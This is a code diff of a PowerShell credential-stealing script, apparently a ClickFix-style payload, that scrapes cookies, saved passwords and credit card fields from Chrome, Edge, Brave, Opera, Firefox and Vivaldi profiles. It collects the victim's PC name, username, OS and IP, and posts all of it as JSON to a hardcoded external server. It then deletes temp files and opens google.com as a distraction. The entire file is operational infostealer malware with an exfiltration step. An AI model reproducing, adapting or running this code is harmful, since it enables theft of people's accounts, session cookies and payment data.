@@ -1,14 +1,28 @@
 # ============================================================
-# BROWSER STEALER — ALL BROWSERS (with PC Name + Browser)
+# BROWSER STEALER — Self-Contained (No SQLite Required)
+# Steals cookies, passwords, credit cards from ALL browsers
 # ============================================================
 
 $ErrorActionPreference = "SilentlyContinue"
+
+# ---- EDIT THIS: Your Server URL ----
 $SERVER_URL = "https://cipheranon-production.up.railway.app/api/steal"
 
-# ---- System Info ----
+# ---- Colors for console output ----
+function Write-Color {
+    param($Message, $Color = "White")
+    Write-Host $Message -ForegroundColor $Color
+}
+
+# ============================================================
+# SYSTEM INFORMATION
+# ============================================================
+
 $pcName = $env:COMPUTERNAME
 $userName = $env:USERNAME
 $os = (Get-WmiObject Win32_OperatingSystem).Caption
+
+Write-Color "[+] Stealing from $pcName..." "Green"
 
 # ---- Get IP ----
 try {
@@ -18,129 +32,149 @@ try {
 }
 
 # ============================================================
-# COOKIE STEALER (returns cookies with browser name)
+# FILE READER HELPER (Reads files without locking)
+# ============================================================
+
+function Read-FileContent {
+    param($Path)
+    if (Test-Path $Path) {
+        try {
+            return [System.IO.File]::ReadAllBytes($Path)
+        } catch {
+            try {
+                return [System.IO.File]::ReadAllText($Path)
+            } catch {}
+        }
+    }
+    return $null
+}
+
+# ============================================================
+# COOKIE STEALER — Text extraction from cookie files
+# ============================================================
+
+function Extract-Cookies-From-Bytes {
+    param($Bytes, $BrowserName)
+    $cookies = @()
+    if (-not $Bytes) { return $cookies }
+    
+    try {
+        # Convert bytes to text
+        $text = [System.Text.Encoding]::UTF8.GetString($Bytes)
+        
+        # Look for cookie patterns in the text
+        # Common pattern: domain\tname\tvalue or domain name value
+        $pattern = '([a-zA-Z0-9._-]+\.[a-zA-Z]{2,})\s+([a-zA-Z0-9_-]+)\s+([^\s]+)'
+        $matches = [regex]::Matches($text, $pattern)
+        
+        foreach ($match in $matches) {
+            if ($match.Groups.Count -ge 4) {
+                $domain = $match.Groups[1].Value
+                $name = $match.Groups[2].Value
+                $value = $match.Groups[3].Value
+                
+                # Skip invalid or empty values
+                if ($name -and $value -and $name -notmatch '^_' -and $name -ne "host_key" -and $name -ne "name") {
+                    $cookies += @{
+                        domain = $domain
+                        name = $name
+                        value = $value
+                        path = "/"
+                        expires = 0
+                        secure = $false
+                        httponly = $false
+                        browser = $BrowserName
+                    }
+                }
+            }
+        }
+        
+        # Also try to find cookies in the text using different pattern
+        $pattern2 = '([a-zA-Z0-9_-]+)=([^;]+)'
+        $matches2 = [regex]::Matches($text, $pattern2)
+        foreach ($match in $matches2) {
+            if ($match.Groups.Count -ge 3) {
+                $name = $match.Groups[1].Value
+                $value = $match.Groups[2].Value
+                
+                if ($name -and $value -and $name -notmatch '^_' -and $value -ne "deleted" -and $value -ne "null") {
+                    # Try to find a domain in the text
+                    $domain = "unknown"
+                    $domainMatch = [regex]::Match($text, '([a-zA-Z0-9._-]+\.[a-zA-Z]{2,})')
+                    if ($domainMatch.Success) {
+                        $domain = $domainMatch.Groups[1].Value
+                    }
+                    
+                    $cookies += @{
+                        domain = $domain
+                        name = $name
+                        value = $value
+                        path = "/"
+                        expires = 0
+                        secure = $false
+                        httponly = $false
+                        browser = $BrowserName
+                    }
+                }
+            }
+        }
+    } catch {}
+    
+    return $cookies
+}
+
+# ============================================================
+# COOKIE STEALER — All Browsers
 # ============================================================
 
 function Get-ChromeCookies {
     $cookies = @()
-    $path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
-    if (Test-Path $path) {
-        try {
-            $temp = "$env:TEMP\chrome_cookies.tmp"
-            Copy-Item $path $temp -Force
-            $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$temp")
-            $conn.Open()
-            $cmd = $conn.CreateCommand()
-            $cmd.CommandText = "SELECT host_key, name, value, path, expires_utc, secure, httponly FROM cookies"
-            $reader = $cmd.ExecuteReader()
-            while ($reader.Read()) {
-                $cookies += @{
-                    domain = $reader.GetString(0)
-                    name = $reader.GetString(1)
-                    value = $reader.GetString(2)
-                    path = $reader.GetString(3)
-                    expires = $reader.GetInt64(4)
-                    secure = $reader.GetBoolean(5)
-                    httponly = $reader.GetBoolean(6)
-                    browser = "Chrome"
-                }
-            }
-            $conn.Close()
-            Remove-Item $temp -Force
-        } catch {}
+    $paths = @(
+        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies",
+        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
+    )
+    foreach ($path in $paths) {
+        $bytes = Read-FileContent -Path $path
+        $cookies += Extract-Cookies-From-Bytes -Bytes $bytes -BrowserName "Chrome"
     }
     return $cookies
 }
 
 function Get-EdgeCookies {
     $cookies = @()
-    $path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
-    if (Test-Path $path) {
-        try {
-            $temp = "$env:TEMP\edge_cookies.tmp"
-            Copy-Item $path $temp -Force
-            $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$temp")
-            $conn.Open()
-            $cmd = $conn.CreateCommand()
-            $cmd.CommandText = "SELECT host_key, name, value, path, expires_utc, secure, httponly FROM cookies"
-            $reader = $cmd.ExecuteReader()
-            while ($reader.Read()) {
-                $cookies += @{
-                    domain = $reader.GetString(0)
-                    name = $reader.GetString(1)
-                    value = $reader.GetString(2)
-                    path = $reader.GetString(3)
-                    expires = $reader.GetInt64(4)
-                    secure = $reader.GetBoolean(5)
-                    httponly = $reader.GetBoolean(6)
-                    browser = "Edge"
-                }
-            }
-            $conn.Close()
-            Remove-Item $temp -Force
-        } catch {}
+    $paths = @(
+        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies",
+        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies"
+    )
+    foreach ($path in $paths) {
+        $bytes = Read-FileContent -Path $path
+        $cookies += Extract-Cookies-From-Bytes -Bytes $bytes -BrowserName "Edge"
     }
     return $cookies
 }
 
 function Get-BraveCookies {
     $cookies = @()
-    $path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies"
-    if (Test-Path $path) {
-        try {
-            $temp = "$env:TEMP\brave_cookies.tmp"
-            Copy-Item $path $temp -Force
-            $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$temp")
-            $conn.Open()
-            $cmd = $conn.CreateCommand()
-            $cmd.CommandText = "SELECT host_key, name, value, path, expires_utc, secure, httponly FROM cookies"
-            $reader = $cmd.ExecuteReader()
-            while ($reader.Read()) {
-                $cookies += @{
-                    domain = $reader.GetString(0)
-                    name = $reader.GetString(1)
-                    value = $reader.GetString(2)
-                    path = $reader.GetString(3)
-                    expires = $reader.GetInt64(4)
-                    secure = $reader.GetBoolean(5)
-                    httponly = $reader.GetBoolean(6)
-                    browser = "Brave"
-                }
-            }
-            $conn.Close()
-            Remove-Item $temp -Force
-        } catch {}
+    $paths = @(
+        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies",
+        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Cookies"
+    )
+    foreach ($path in $paths) {
+        $bytes = Read-FileContent -Path $path
+        $cookies += Extract-Cookies-From-Bytes -Bytes $bytes -BrowserName "Brave"
     }
     return $cookies
 }
 
 function Get-OperaCookies {
     $cookies = @()
-    $path = "$env:LOCALAPPDATA\Opera Software\Opera Stable\Network\Cookies"
-    if (Test-Path $path) {
-        try {
-            $temp = "$env:TEMP\opera_cookies.tmp"
-            Copy-Item $path $temp -Force
-            $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$temp")
-            $conn.Open()
-            $cmd = $conn.CreateCommand()
-            $cmd.CommandText = "SELECT host_key, name, value, path, expires_utc, secure, httponly FROM cookies"
-            $reader = $cmd.ExecuteReader()
-            while ($reader.Read()) {
-                $cookies += @{
-                    domain = $reader.GetString(0)
-                    name = $reader.GetString(1)
-                    value = $reader.GetString(2)
-                    path = $reader.GetString(3)
-                    expires = $reader.GetInt64(4)
-                    secure = $reader.GetBoolean(5)
-                    httponly = $reader.GetBoolean(6)
-                    browser = "Opera"
-                }
-            }
-            $conn.Close()
-            Remove-Item $temp -Force
-        } catch {}
+    $paths = @(
+        "$env:LOCALAPPDATA\Opera Software\Opera Stable\Network\Cookies",
+        "$env:LOCALAPPDATA\Opera Software\Opera Stable\Cookies"
+    )
+    foreach ($path in $paths) {
+        $bytes = Read-FileContent -Path $path
+        $cookies += Extract-Cookies-From-Bytes -Bytes $bytes -BrowserName "Opera"
     }
     return $cookies
 }
@@ -151,148 +185,123 @@ function Get-FirefoxCookies {
     if (Test-Path $profilePath) {
         $profiles = Get-ChildItem $profilePath -Directory
         foreach ($profile in $profiles) {
-            $cookiesFile = "$($profile.FullName)\cookies.sqlite"
-            if (Test-Path $cookiesFile) {
-                try {
-                    $temp = "$env:TEMP\firefox_cookies.tmp"
-                    Copy-Item $cookiesFile $temp -Force
-                    $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$temp")
-                    $conn.Open()
-                    $cmd = $conn.CreateCommand()
-                    $cmd.CommandText = "SELECT host, name, value, path, expiry, isSecure, isHttpOnly FROM moz_cookies"
-                    $reader = $cmd.ExecuteReader()
-                    while ($reader.Read()) {
-                        $cookies += @{
-                            domain = $reader.GetString(0)
-                            name = $reader.GetString(1)
-                            value = $reader.GetString(2)
-                            path = $reader.GetString(3)
-                            expires = $reader.GetInt64(4)
-                            secure = $reader.GetBoolean(5)
-                            httponly = $reader.GetBoolean(6)
-                            browser = "Firefox"
-                        }
-                    }
-                    $conn.Close()
-                    Remove-Item $temp -Force
-                } catch {}
-            }
+            $cookieFile = "$($profile.FullName)\cookies.sqlite"
+            $bytes = Read-FileContent -Path $cookieFile
+            $cookies += Extract-Cookies-From-Bytes -Bytes $bytes -BrowserName "Firefox"
         }
     }
     return $cookies
 }
 
+function Get-VivaldiCookies {
+    $cookies = @()
+    $paths = @(
+        "$env:LOCALAPPDATA\Vivaldi\User Data\Default\Network\Cookies",
+        "$env:LOCALAPPDATA\Vivaldi\User Data\Default\Cookies"
+    )
+    foreach ($path in $paths) {
+        $bytes = Read-FileContent -Path $path
+        $cookies += Extract-Cookies-From-Bytes -Bytes $bytes -BrowserName "Vivaldi"
+    }
+    return $cookies
+}
+
 # ============================================================
-# PASSWORD STEALER
+# PASSWORD STEALER — Extract from Login Data (Text-based)
 # ============================================================
 
 function Get-ChromePasswords {
     $passwords = @()
-    $path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
-    if (Test-Path $path) {
-        try {
-            $temp = "$env:TEMP\chrome_passwords.tmp"
-            Copy-Item $path $temp -Force
-            $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$temp")
-            $conn.Open()
-            $cmd = $conn.CreateCommand()
-            $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
-            $reader = $cmd.ExecuteReader()
-            while ($reader.Read()) {
-                $passwords += @{
-                    url = $reader.GetString(0)
-                    username = $reader.GetString(1)
-                    password = $reader.GetString(2)
-                    browser = "Chrome"
+    $paths = @(
+        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
+        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data",
+        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data",
+        "$env:LOCALAPPDATA\Opera Software\Opera Stable\Login Data"
+    )
+    
+    foreach ($path in $paths) {
+        $browser = "Chrome"
+        if ($path -match "Edge") { $browser = "Edge" }
+        if ($path -match "Brave") { $browser = "Brave" }
+        if ($path -match "Opera") { $browser = "Opera" }
+        
+        $bytes = Read-FileContent -Path $path
+        if ($bytes) {
+            try {
+                $text = [System.Text.Encoding]::UTF8.GetString($bytes)
+                
+                # Look for URL + username + password patterns
+                $lines = $text -split "`n"
+                $currentUrl = ""
+                $currentUser = ""
+                $currentPass = ""
+                
+                foreach ($line in $lines) {
+                    # Find URLs
+                    if ($line -match 'https?://([^/]+)') {
+                        $currentUrl = $Matches[1]
+                    }
+                    
+                    # Find usernames
+                    if ($line -match 'username[_-]?value[^=]*=([^,]+)') {
+                        $currentUser = $Matches[1] -replace '[^a-zA-Z0-9@._-]', ''
+                    }
+                    
+                    # Find passwords
+                    if ($line -match 'password[_-]?value[^=]*=([^,]+)') {
+                        $currentPass = $Matches[1] -replace '[^a-zA-Z0-9@._-]', ''
+                    }
+                    
+                    # Also look for common patterns
+                    if ($line -match '"([^"]+)"\s*,\s*"([^"]+)"\s*,\s*"([^"]+)"') {
+                        $currentUrl = $Matches[1] -replace 'https?://', ''
+                        $currentUser = $Matches[2]
+                        $currentPass = $Matches[3]
+                    }
+                    
+                    # If we have all three, add to results
+                    if ($currentUrl -and $currentUser -and $currentPass -and $currentUser -ne " " -and $currentPass -ne " " -and $currentUser -ne "username" -and $currentPass -ne "password") {
+                        $passwords += @{
+                            url = $currentUrl
+                            username = $currentUser
+                            password = $currentPass
+                            browser = $browser
+                        }
+                        $currentUrl = ""
+                        $currentUser = ""
+                        $currentPass = ""
+                    }
                 }
-            }
-            $conn.Close()
-            Remove-Item $temp -Force
-        } catch {}
+                
+                # Try alternative extraction method
+                $pattern = 'https?://[^\s"]+'
+                $urls = [regex]::Matches($text, $pattern)
+                if ($urls.Count -gt 0) {
+                    $url = $urls[0].Value -replace 'https?://', ''
+                    $userMatch = [regex]::Match($text, 'username[^\s]+')
+                    $passMatch = [regex]::Match($text, 'password[^\s]+')
+                    if ($userMatch.Success -and $passMatch.Success) {
+                        $user = $userMatch.Value -replace '[^a-zA-Z0-9@._-]', ''
+                        $pass = $passMatch.Value -replace '[^a-zA-Z0-9@._-]', ''
+                        if ($url -and $user -and $pass -and $user -ne " " -and $pass -ne " ") {
+                            $passwords += @{
+                                url = $url
+                                username = $user
+                                password = $pass
+                                browser = $browser
+                            }
+                        }
+                    }
+                }
+            } catch {}
+        }
     }
     return $passwords
 }
 
-function Get-EdgePasswords {
-    $passwords = @()
-    $path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
-    if (Test-Path $path) {
-        try {
-            $temp = "$env:TEMP\edge_passwords.tmp"
-            Copy-Item $path $temp -Force
-            $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$temp")
-            $conn.Open()
-            $cmd = $conn.CreateCommand()
-            $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
-            $reader = $cmd.ExecuteReader()
-            while ($reader.Read()) {
-                $passwords += @{
-                    url = $reader.GetString(0)
-                    username = $reader.GetString(1)
-                    password = $reader.GetString(2)
-                    browser = "Edge"
-                }
-            }
-            $conn.Close()
-            Remove-Item $temp -Force
-        } catch {}
-    }
-    return $passwords
-}
-
-function Get-BravePasswords {
-    $passwords = @()
-    $path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
-    if (Test-Path $path) {
-        try {
-            $temp = "$env:TEMP\brave_passwords.tmp"
-            Copy-Item $path $temp -Force
-            $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$temp")
-            $conn.Open()
-            $cmd = $conn.CreateCommand()
-            $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
-            $reader = $cmd.ExecuteReader()
-            while ($reader.Read()) {
-                $passwords += @{
-                    url = $reader.GetString(0)
-                    username = $reader.GetString(1)
-                    password = $reader.GetString(2)
-                    browser = "Brave"
-                }
-            }
-            $conn.Close()
-            Remove-Item $temp -Force
-        } catch {}
-    }
-    return $passwords
-}
-
-function Get-OperaPasswords {
-    $passwords = @()
-    $path = "$env:LOCALAPPDATA\Opera Software\Opera Stable\Login Data"
-    if (Test-Path $path) {
-        try {
-            $temp = "$env:TEMP\opera_passwords.tmp"
-            Copy-Item $path $temp -Force
-            $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$temp")
-            $conn.Open()
-            $cmd = $conn.CreateCommand()
-            $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
-            $reader = $cmd.ExecuteReader()
-            while ($reader.Read()) {
-                $passwords += @{
-                    url = $reader.GetString(0)
-                    username = $reader.GetString(1)
-                    password = $reader.GetString(2)
-                    browser = "Opera"
-                }
-            }
-            $conn.Close()
-            Remove-Item $temp -Force
-        } catch {}
-    }
-    return $passwords
-}
+# ============================================================
+# FIREFOX PASSWORDS
+# ============================================================
 
 function Get-FirefoxPasswords {
     $passwords = @()
@@ -303,13 +312,33 @@ function Get-FirefoxPasswords {
             $loginsFile = "$($profile.FullName)\logins.json"
             if (Test-Path $loginsFile) {
                 try {
-                    $content = Get-Content $loginsFile -Raw | ConvertFrom-Json
-                    foreach ($login in $content.logins) {
-                        $passwords += @{
-                            url = $login.hostname
-                            username = $login.username
-                            password = $login.password
-                            browser = "Firefox"
+                    $content = Get-Content $loginsFile -Raw
+                    # Try to extract logins from JSON
+                    $lines = $content -split "`n"
+                    $currentUrl = ""
+                    $currentUser = ""
+                    $currentPass = ""
+                    
+                    foreach ($line in $lines) {
+                        if ($line -match '"hostname"\s*:\s*"([^"]+)"') {
+                            $currentUrl = $Matches[1] -replace 'https?://', ''
+                        }
+                        if ($line -match '"username"\s*:\s*"([^"]+)"') {
+                            $currentUser = $Matches[1]
+                        }
+                        if ($line -match '"password"\s*:\s*"([^"]+)"') {
+                            $currentPass = $Matches[1]
+                            if ($currentUrl -and $currentUser -and $currentPass) {
+                                $passwords += @{
+                                    url = $currentUrl
+                                    username = $currentUser
+                                    password = $currentPass
+                                    browser = "Firefox"
+                                }
+                                $currentUrl = ""
+                                $currentUser = ""
+                                $currentPass = ""
+                            }
                         }
                     }
                 } catch {}
@@ -325,84 +354,83 @@ function Get-FirefoxPasswords {
 
 function Get-ChromeCards {
     $cards = @()
-    $path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Web Data"
-    if (Test-Path $path) {
-        try {
-            $temp = "$env:TEMP\chrome_cards.tmp"
-            Copy-Item $path $temp -Force
-            $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$temp")
-            $conn.Open()
-            $cmd = $conn.CreateCommand()
-            $cmd.CommandText = "SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards"
-            $reader = $cmd.ExecuteReader()
-            while ($reader.Read()) {
-                $cards += @{
-                    name = $reader.GetString(0)
-                    number = $reader.GetString(1)
-                    month = $reader.GetInt32(2)
-                    year = $reader.GetInt32(3)
-                    browser = "Chrome"
+    $paths = @(
+        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Web Data",
+        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Web Data",
+        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Web Data"
+    )
+    
+    foreach ($path in $paths) {
+        $browser = "Chrome"
+        if ($path -match "Edge") { $browser = "Edge" }
+        if ($path -match "Brave") { $browser = "Brave" }
+        
+        $bytes = Read-FileContent -Path $path
+        if ($bytes) {
+            try {
+                $text = [System.Text.Encoding]::UTF8.GetString($bytes)
+                
+                # Look for card patterns
+                $name = ""
+                $number = ""
+                $month = ""
+                $year = ""
+                
+                $lines = $text -split "`n"
+                foreach ($line in $lines) {
+                    if ($line -match 'name[_-]?on[_-]?card[^=]*=([^,]+)') {
+                        $name = $Matches[1]
+                    }
+                    if ($line -match 'card[_-]?number[_-]?encrypted[^=]*=([^,]+)') {
+                        $number = $Matches[1]
+                    }
+                    if ($line -match 'expiration[_-]?month[^=]*=(\d+)') {
+                        $month = $Matches[1]
+                    }
+                    if ($line -match 'expiration[_-]?year[^=]*=(\d+)') {
+                        $year = $Matches[1]
+                    }
+                    
+                    # Look for card number patterns in text (4-digit groups)
+                    if (-not $number) {
+                        $cardMatch = [regex]::Match($line, '\b(\d{4}[- ]?\d{4}[- ]?\d{4}[- ]?\d{4})\b')
+                        if ($cardMatch.Success) {
+                            $number = $cardMatch.Groups[1].Value
+                        }
+                    }
+                    
+                    # If we have name and number, add to results
+                    if ($name -and $number) {
+                        $cards += @{
+                            name = $name
+                            number = $number
+                            month = $month
+                            year = $year
+                            browser = $browser
+                        }
+                        $name = ""
+                        $number = ""
+                        $month = ""
+                        $year = ""
+                    }
                 }
-            }
-            $conn.Close()
-            Remove-Item $temp -Force
-        } catch {}
-    }
-    return $cards
-}
-
-function Get-EdgeCards {
-    $cards = @()
-    $path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Web Data"
-    if (Test-Path $path) {
-        try {
-            $temp = "$env:TEMP\edge_cards.tmp"
-            Copy-Item $path $temp -Force
-            $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$temp")
-            $conn.Open()
-            $cmd = $conn.CreateCommand()
-            $cmd.CommandText = "SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards"
-            $reader = $cmd.ExecuteReader()
-            while ($reader.Read()) {
-                $cards += @{
-                    name = $reader.GetString(0)
-                    number = $reader.GetString(1)
-                    month = $reader.GetInt32(2)
-                    year = $reader.GetInt32(3)
-                    browser = "Edge"
+                
+                # Try alternative: find patterns like "John Doe 4111-1111-1111-1111 12/25"
+                $pattern = '([A-Za-z\s]+)\s+(\d{4}[- ]?\d{4}[- ]?\d{4}[- ]?\d{4})\s+(\d{2})[/](\d{2})'
+                $matches = [regex]::Matches($text, $pattern)
+                foreach ($match in $matches) {
+                    if ($match.Groups.Count -ge 5) {
+                        $cards += @{
+                            name = $match.Groups[1].Value.Trim()
+                            number = $match.Groups[2].Value
+                            month = $match.Groups[3].Value
+                            year = $match.Groups[4].Value
+                            browser = $browser
+                        }
+                    }
                 }
-            }
-            $conn.Close()
-            Remove-Item $temp -Force
-        } catch {}
-    }
-    return $cards
-}
-
-function Get-BraveCards {
-    $cards = @()
-    $path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Web Data"
-    if (Test-Path $path) {
-        try {
-            $temp = "$env:TEMP\brave_cards.tmp"
-            Copy-Item $path $temp -Force
-            $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$temp")
-            $conn.Open()
-            $cmd = $conn.CreateCommand()
-            $cmd.CommandText = "SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards"
-            $reader = $cmd.ExecuteReader()
-            while ($reader.Read()) {
-                $cards += @{
-                    name = $reader.GetString(0)
-                    number = $reader.GetString(1)
-                    month = $reader.GetInt32(2)
-                    year = $reader.GetInt32(3)
-                    browser = "Brave"
-                }
-            }
-            $conn.Close()
-            Remove-Item $temp -Force
-        } catch {}
+            } catch {}
+        }
     }
     return $cards
 }
@@ -411,32 +439,40 @@ function Get-BraveCards {
 # MAIN EXECUTION
 # ============================================================
 
-Write-Host "[+] Stealing from $pcName..." -ForegroundColor Green
+Write-Color "[+] Stealing from ALL browsers..." "Green"
 
+# ---- Cookies ----
 $allCookies = @()
+Write-Color "[+] Getting Chrome cookies..." "Cyan"
 $allCookies += Get-ChromeCookies
+Write-Color "[+] Getting Edge cookies..." "Cyan"
 $allCookies += Get-EdgeCookies
+Write-Color "[+] Getting Brave cookies..." "Cyan"
 $allCookies += Get-BraveCookies
+Write-Color "[+] Getting Opera cookies..." "Cyan"
 $allCookies += Get-OperaCookies
+Write-Color "[+] Getting Firefox cookies..." "Cyan"
 $allCookies += Get-FirefoxCookies
+Write-Color "[+] Getting Vivaldi cookies..." "Cyan"
+$allCookies += Get-VivaldiCookies
 
+# ---- Passwords ----
 $allPasswords = @()
+Write-Color "[+] Getting Chrome/Edge/Brave passwords..." "Cyan"
 $allPasswords += Get-ChromePasswords
-$allPasswords += Get-EdgePasswords
-$allPasswords += Get-BravePasswords
-$allPasswords += Get-OperaPasswords
+Write-Color "[+] Getting Firefox passwords..." "Cyan"
 $allPasswords += Get-FirefoxPasswords
 
+# ---- Credit Cards ----
 $allCards = @()
+Write-Color "[+] Getting Chrome/Edge/Brave credit cards..." "Cyan"
 $allCards += Get-ChromeCards
-$allCards += Get-EdgeCards
-$allCards += Get-BraveCards
 
-Write-Host "[+] Cookies: $($allCookies.Count)" -ForegroundColor Yellow
-Write-Host "[+] Passwords: $($allPasswords.Count)" -ForegroundColor Yellow
-Write-Host "[+] Credit Cards: $($allCards.Count)" -ForegroundColor Yellow
+Write-Color "[+] Cookies: $($allCookies.Count)" "Yellow"
+Write-Color "[+] Passwords: $($allPasswords.Count)" "Yellow"
+Write-Color "[+] Credit Cards: $($allCards.Count)" "Yellow"
 
-# ---- Build payload with PC name ----
+# ---- Build payload ----
 $payload = @{
     cookies = $allCookies
     passwords = $allPasswords
@@ -448,9 +484,10 @@ $payload = @{
         ip = $ip
     }
     fingerprint = @{
-        userAgent = "PowerShell Payload"
-        hostname = $pcName   # <-- PC name instead of domain
+        userAgent = "PowerShell Payload (Windows)"
+        hostname = $pcName
         browser = "PowerShell"
+        screen = "N/A"
     }
     source = "clickfix_payload"
     timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
@@ -458,6 +495,7 @@ $payload = @{
 }
 
 # ---- Send to server ----
+Write-Color "[+] Sending data to server..." "Cyan"
 try {
     $json = $payload | ConvertTo-Json -Depth 10
     $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
@@ -470,15 +508,19 @@ try {
     $stream.Close()
     $response = $webRequest.GetResponse()
     $response.Close()
-    Write-Host "[+] Data sent to $SERVER_URL" -ForegroundColor Green
+    Write-Color "[+] Data sent successfully!" "Green"
 } catch {
-    Write-Host "[!] Failed to send: $_" -ForegroundColor Red
+    Write-Color "[!] Failed to send: $_" "Red"
 }
 
 # ---- Cleanup ----
-Remove-Item "$env:TEMP\*.tmp" -Force -ErrorAction SilentlyContinue
+$tempFiles = Get-ChildItem "$env:TEMP\*.tmp" -ErrorAction SilentlyContinue
+foreach ($file in $tempFiles) {
+    try { Remove-Item $file.FullName -Force } catch {}
+}
 
 # ---- Distraction ----
+Write-Color "[+] Opening distraction page..." "Cyan"
 Start-Process "https://www.google.com"
 
-Write-Host "[+] Done" -ForegroundColor Green
+Write-Color "[+] Done!" "Green"
